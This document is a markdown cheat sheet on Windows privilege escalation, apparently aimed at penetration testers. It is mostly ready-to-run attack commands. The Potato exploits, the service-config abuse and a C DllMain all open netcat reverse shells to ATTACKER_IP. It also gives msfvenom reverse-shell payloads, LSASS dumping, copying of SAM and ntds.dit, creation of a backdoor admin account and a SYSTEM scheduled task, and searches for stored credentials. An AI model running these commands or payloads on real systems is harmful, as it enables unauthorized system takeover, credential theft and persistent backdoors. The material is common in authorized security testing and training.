# Windows Privilege Escalation Guide

> *"From user to SYSTEM - every Windows box has a path."*

## Quick Enumeration

```cmd
whoami /all && systeminfo && net users && netstat -ano
```

## Kernel Exploits

### Check System Info
```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic os get osarchitecture
```

### Notable Windows Exploits

#### PrintNightmare (CVE-2021-1675/34527)
```powershell
# Check if vulnerable
Get-Service -Name Spooler | Select-Object Status
# If Spooler is running, may be vulnerable

# Multiple exploit implementations available
# Requires RPC access to target
```

#### EternalBlue (MS17-010)
```bash
# SMBv1 vulnerability
# Check from Kali
nmap -p445 --script smb-vuln-ms17-010 TARGET

# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
```

#### Local Exploits (Recent)
```
# Check Windows version and patch level
systeminfo

# Use Windows-Exploit-Suggester
./windows-exploit-suggester.py --database 2024-XX-XX-mssb.xls --systeminfo sysinfo.txt

# Or WES-NG
wes.py systeminfo.txt
```

### Using Exploit Suggesters
```bash
# Windows Exploit Suggester - Next Generation
python wes.py systeminfo.txt

# Sherlock (PowerShell)
Import-Module .\Sherlock.ps1
Find-AllVulns
```

## Token Manipulation

### Check Token Privileges
```cmd
whoami /priv
```

### SeImpersonatePrivilege

#### JuicyPotato (Windows 7/2008/2012/2016)
```cmd
# Find valid CLSID for OS version
# https://github.com/ohpe/juicy-potato/tree/master/CLSID

.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe ATTACKER_IP 4444 -e cmd" -t * -c {CLSID}
```

#### RoguePotato (Windows 10/2019)
```cmd
# Start socat listener on attacker
socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999

# On target
.\RoguePotato.exe -r ATTACKER_IP -e "cmd /c c:\users\public\nc.exe ATTACKER_IP 4444 -e cmd" -l 9999
```

#### PrintSpoofer (Windows 10/2016/2019)
```cmd
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "c:\users\public\nc.exe ATTACKER_IP 4444 -e cmd"
```

#### GodPotato (Latest)
```cmd
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c nc ATTACKER_IP 4444 -e cmd"
```

#### SweetPotato
```cmd
.\SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami"
```

### SeDebugPrivilege
```powershell
# Dump LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Or migrate to SYSTEM process using Meterpreter
# meterpreter > migrate PID
```

### SeBackupPrivilege
```powershell
# Copy protected files
robocopy /b c:\windows\ntds . ntds.dit
robocopy /b c:\windows\system32\config . SAM
robocopy /b c:\windows\system32\config . SYSTEM
```

### SeTakeOwnershipPrivilege
```cmd
# Take ownership of file
takeown /f c:\windows\system32\config\SAM
icacls c:\windows\system32\config\SAM /grant administrators:F
```

### SeLoadDriverPrivilege
```powershell
# Load malicious driver
# Capcom.sys driver exploitation
```

## Service Exploitation

### Unquoted Service Paths
```cmd
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | ?{$_.PathName -notmatch '^"' -and $_.PathName -match '\s'} | select Name,PathName
```

#### Exploitation
```
# Path: C:\Program Files\Vuln Service\app\service.exe
# Try placing executables at:
C:\Program.exe
C:\Program Files\Vuln.exe
C:\Program Files\Vuln Service\app.exe

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe > Program.exe

# Restart service
sc stop VulnService
sc start VulnService
```

### Weak Service Permissions
```cmd
# Check permissions with accesschk
.\accesschk.exe /accepteula -uwcqv "user" *
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
.\accesschk.exe /accepteula -uwcqv "Everyone" *

# Check specific service
.\accesschk.exe /accepteula -uwcqv "ServiceName"
sc qc ServiceName
```

#### Exploitation
```cmd
# If SERVICE_CHANGE_CONFIG permission
sc config VulnService binpath= "net user backdoor Password123! /add"
sc stop VulnService
sc start VulnService

sc config VulnService binpath= "net localgroup administrators backdoor /add"
sc stop VulnService
sc start VulnService

# Or for reverse shell
sc config VulnService binpath= "C:\path\to\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

### Weak Binary Permissions
```cmd
# Check binary permissions
.\accesschk.exe /accepteula -quvw "C:\path\to\service.exe"
icacls "C:\path\to\service.exe"

# If writable, replace with malicious binary
copy malicious.exe "C:\path\to\service.exe"
sc stop ServiceName
sc start ServiceName
```

### Weak Registry Permissions
```cmd
# Check registry key permissions
.\accesschk.exe /accepteula -uvwqk HKLM\SYSTEM\CurrentControlSet\Services\VulnService

# If KEY_ALL_ACCESS, modify ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnService /v ImagePath /t REG_EXPAND_SZ /d "C:\path\to\malicious.exe" /f
```

## DLL Hijacking

### Finding Hijackable DLLs
```
# Use Process Monitor (procmon)
# Filter:
#   Operation: CreateFile
#   Result: NAME NOT FOUND
#   Path ends with: .dll

# Run target service/application
# Look for missing DLLs in writable locations
```

### Common Targets
```
# Application directory (if writable)
# PATH directories (if writable)
# Windows known DLL search order

# Generate malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll > malicious.dll

# DLL with exported functions
// dllmain.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        WinExec("cmd.exe /c nc.exe ATTACKER_IP 4444 -e cmd.exe", 0);
    }
    return TRUE;
}
```

## Registry Attacks

### AlwaysInstallElevated
```cmd
# Check both keys (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1, exploit:
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > malicious.msi
msiexec /quiet /qn /i malicious.msi
```

### AutoRun Programs
```cmd
# Check AutoRun locations
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions on AutoRun executables
.\accesschk.exe /accepteula -wvu "C:\Path\To\AutoRun.exe"

# If writable, replace
copy malicious.exe "C:\Path\To\AutoRun.exe"
```

### AutoLogon Credentials
```cmd
# Check for stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
```

## Scheduled Tasks

### Enumeration
```cmd
# List all tasks
schtasks /query /fo LIST /v

# PowerShell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

### Exploitation
```cmd
# Check permissions on task binary
.\accesschk.exe /accepteula -wvu "C:\Path\To\Task\Binary.exe"

# If writable, replace
copy malicious.exe "C:\Path\To\Task\Binary.exe"

# Create new task (if have permissions)
schtasks /create /sc onlogon /tn "Backdoor" /tr "C:\path\to\malicious.exe" /ru SYSTEM
```

## Credential Hunting

### Common Credential Locations
```cmd
# Saved credentials
cmdkey /list

# Unattend/Sysprep files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\sysprep\unattend.xml
type C:\Windows\System32\sysprep\Panther\unattend.xml

# Group Policy Preferences
# Look for cpassword in XML files
type \\domain.local\SYSVOL\domain.local\Policies\*\Machine\Preferences\Groups\Groups.xml

# Registry
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query HKCU\SOFTWARE\ORL\WinVNC3\Password
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# SAM and SYSTEM (from backup/shadow copies)
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

### Password in Files
```cmd
# Search for passwords in files
findstr /si "password" *.txt *.xml *.config *.ini
findstr /spin "password" *.*

# Common config files
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
```

## Application-Specific Exploits

### IIS
```cmd
# AppCmd (if accessible)
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*

# Web.config credentials
type C:\inetpub\wwwroot\web.config | findstr "connectionString"
```

### SQL Server
```cmd
# If xp_cmdshell enabled
# Can execute commands as service account
EXEC xp_cmdshell 'whoami'
```

### Jenkins
```
# If accessible, execute commands via:
# http://target/script
# Groovy console
```

## Automated Tools

### WinPEAS
```cmd
.\winPEASany.exe

# Quiet mode
.\winPEASany.exe quiet
```

### PowerUp
```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Specific checks
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
```

### Sherlock
```powershell
Import-Module .\Sherlock.ps1
Find-AllVulns
```

## Quick Reference Checklist

```
1. System Information
   [ ] systeminfo
   [ ] wmic os get osarchitecture

2. User Context
   [ ] whoami /all
   [ ] net user %username%

3. Token Privileges
   [ ] whoami /priv
   [ ] Check for SeImpersonate/SeAssignPrimaryToken

4. Services
   [ ] Unquoted paths
   [ ] Weak permissions
   [ ] Weak binary permissions

5. DLL Hijacking
   [ ] Missing DLLs in writable paths

6. Registry
   [ ] AlwaysInstallElevated
   [ ] AutoRun programs
   [ ] AutoLogon credentials

7. Scheduled Tasks
   [ ] Task binary permissions

8. Credential Hunting
   [ ] cmdkey /list
   [ ] Unattend.xml files
   [ ] PowerShell history

9. Kernel Exploits
   [ ] Run exploit suggester

10. Application Specific
    [ ] IIS, SQL Server, etc.
```
